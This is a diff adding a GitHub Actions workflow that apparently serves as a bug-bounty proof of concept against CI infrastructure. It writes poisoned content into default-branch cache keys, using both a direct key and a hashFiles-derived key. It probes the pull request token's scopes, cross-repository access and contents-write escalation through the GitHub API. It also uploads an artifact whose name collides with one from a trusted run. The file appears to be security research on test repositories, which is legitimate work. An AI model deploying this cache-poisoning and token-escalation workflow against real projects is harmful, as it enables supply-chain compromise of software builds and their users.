@@ -1,0 +1,105 @@
+name: p4-pr-workflow
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+permissions:
+  actions: read
+  contents: write
+
+jobs:
+  prtest:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: record context
+        run: |
+          echo "event=${{ github.event_name }} fork=${{ github.event.pull_request.head.repo.fork }} head_ref=${{ github.head_ref }} base_ref=${{ github.base_ref }}"
+          echo "run_id=$GITHUB_RUN_ID"
+      - name: restore trusted default-branch cache main-cache-Y (b.i direct key)
+        id: r1
+        uses: actions/cache/restore@v6
+        with:
+          path: /tmp/p4-main-marker.txt
+          key: main-cache-Y
+      - name: restore via restore-keys prefix main-cache- (b.ii prefix)
+        id: r2
+        uses: actions/cache/restore@v6
+        with:
+          path: /tmp/p4-prefix-marker.txt
+          key: no-such-key-anywhere
+          restore-keys: |
+            main-cache-
+      - name: restore hashFiles-derived key main-cache-hash (c read)
+        id: r3
+        uses: actions/cache/restore@v6
+        with:
+          path: /tmp/p4-hash-marker.txt
+          key: main-cache-hash-${{ hashFiles('p4-hashfile.txt') }}
+      - name: prepare poisoned content for collision write
+        run: |
+          echo "PR-POISONED-CACHE-${GITHUB_RUN_ID}" > /tmp/p4-poisoned-main.txt
+          echo "PR-POISONED-HASH-${GITHUB_RUN_ID}" > /tmp/p4-poisoned-hash.txt
+          echo "hashfiles_value=${{ hashFiles('p4-hashfile.txt') }}"
+      - name: attempt save main-cache-Y with poisoned content (b.iii write/overwrite)
+        id: save1
+        continue-on-error: true
+        uses: actions/cache/save@v6
+        with:
+          path: /tmp/p4-poisoned-main.txt
+          key: main-cache-Y
+      - name: attempt save main-cache-hash with poisoned content (hash-race write)
+        id: save2
+        continue-on-error: true
+        uses: actions/cache/save@v6
+        with:
+          path: /tmp/p4-poisoned-hash.txt
+          key: main-cache-hash-${{ hashFiles('p4-hashfile.txt') }}
+      - name: token scopes + permissions + escalation probes
+        run: |
+          TOKEN="${{ github.token }}"
+          E=/tmp/p4-pr-evidence.txt
+          : > "$E"
+          echo "=== GET /user (headers) ===" | tee -a "$E"
+          curl -si -H "Authorization: Bearer $TOKEN" "https://api.github.com/user" | grep -iE '^(HTTP|x-oauth-scopes|x-accepted-oauth-scopes|^\{)' | sed -E 's/("(login|name)":)"[^"]*"/\1<redacted>"/' | tee -a "$E"
+          echo "=== GET /repos/<this> permissions (token effective perms) ===" | tee -a "$E"
+          curl -sS -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Darkeydel/gh-bounty-test-1" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("permissions:",d.get("permissions"));print("visibility:",d.get("visibility"))' | tee -a "$E"
+          echo "=== GET /repos/<private> with PR token (cross-repo boundary) ===" | tee -a "$E"
+          curl -sS -o /dev/null -w "status=%{http_code}\n" -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Darkeydel/gh-bounty-private-1" | tee -a "$E"
+          echo "=== permissions escalation: PUT contents create file on PR head branch (contents:write requested) ===" | tee -a "$E"
+          B64=$(printf 'p4 token write probe\n' | base64 -w0)
+          curl -sS -o /dev/null -w "status=%{http_code}\n" -X PUT -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/Darkeydel/gh-bounty-test-1/contents/p4-token-write-probe.txt" -d "{\"message\":\"p4 token write probe\",\"content\":\"$B64\",\"branch\":\"${{ github.head_ref }}\"}" | tee -a "$E"
+          echo "=== cache list: default branch ref ===" | tee -a "$E"
+          curl -sS -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Darkeydel/gh-bounty-test-1/actions/caches?ref=refs/heads/main&per_page=20" | python3 -c 'import sys,json;d=json.load(sys.stdin);[print(a["id"],a["key"],a["ref"],a["created_at"]) for a in d.get("actions_caches",[])]' | tee -a "$E"
+          echo "=== cache list: PR merge ref ===" | tee -a "$E"
+          curl -sS -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Darkeydel/gh-bounty-test-1/actions/caches?ref=refs/pull/${{ github.event.number }}/merge&per_page=20" | python3 -c 'import sys,json;d=json.load(sys.stdin);[print(a["id"],a["key"],a["ref"],a["created_at"]) for a in d.get("actions_caches",[])]' | tee -a "$E"
+          cp "$E" /tmp/p4-pr-evidence-final.txt
+      - name: report restore/save results
+        run: |
+          E=/tmp/p4-pr-evidence-final.txt
+          echo "" | tee -a "$E"
+          echo "=== restore results ===" | tee -a "$E"
+          echo "r1 key=main-cache-Y hit='${{ steps.r1.outputs.cache-hit }}' matched='${{ steps.r1.outputs.cache-matched-key }}'" | tee -a "$E"
+          if [ -f /tmp/p4-main-marker.txt ]; then echo "r1 FILE=$(cat /tmp/p4-main-marker.txt)" | tee -a "$E"; else echo "r1 NO_FILE" | tee -a "$E"; fi
+          echo "r2 restore-keys=main-cache- hit='${{ steps.r2.outputs.cache-hit }}' matched='${{ steps.r2.outputs.cache-matched-key }}'" | tee -a "$E"
+          if [ -f /tmp/p4-prefix-marker.txt ]; then echo "r2 FILE=$(cat /tmp/p4-prefix-marker.txt)" | tee -a "$E"; else echo "r2 NO_FILE" | tee -a "$E"; fi
+          echo "r3 key=main-cache-hash-${{ hashFiles('p4-hashfile.txt') }} hit='${{ steps.r3.outputs.cache-hit }}' matched='${{ steps.r3.outputs.cache-matched-key }}'" | tee -a "$E"
+          if [ -f /tmp/p4-hash-marker.txt ]; then echo "r3 FILE=$(cat /tmp/p4-hash-marker.txt)" | tee -a "$E"; else echo "r3 NO_FILE" | tee -a "$E"; fi
+          echo "save1 outcome=${{ steps.save1.outcome }}" | tee -a "$E"
+          echo "save2 outcome=${{ steps.save2.outcome }}" | tee -a "$E"
+      - name: upload PR artifact (untrusted content)
+        uses: actions/upload-artifact@v4
+        with:
+          name: pr-artifact
+          path: /tmp/p4-pr-evidence-final.txt
+      - name: upload shared-name artifact (PR/untrusted content, name collides with trusted run)
+        uses: actions/upload-artifact@v4
+        with:
+          name: shared-name
+          path: /tmp/p4-poisoned-main.txt
+      - name: upload full evidence bundle
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: p4-pr-evidence
+          path: /tmp/p4-pr-evidence-final.txt
